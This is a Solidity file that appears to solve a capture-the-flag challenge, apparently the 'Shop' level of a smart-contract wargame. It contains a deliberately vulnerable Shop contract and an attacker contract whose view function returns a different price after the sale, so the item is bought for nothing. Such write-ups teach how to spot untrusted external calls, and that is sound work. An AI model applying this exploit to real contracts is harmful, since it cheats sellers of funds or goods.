// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Solution21 {
    // Functions can be declared view in which case they promise not to modify the state.
    // But we can return a different value according to state of external contract.
    function price() public view returns (uint256) {
        Shop shop = Shop(msg.sender);
        return shop.isSold() ? 0 : 100;
    }

    function hack(Shop _shop) public {
        require(!_shop.isSold(), "Already sold");
        _shop.buy();
    }
}
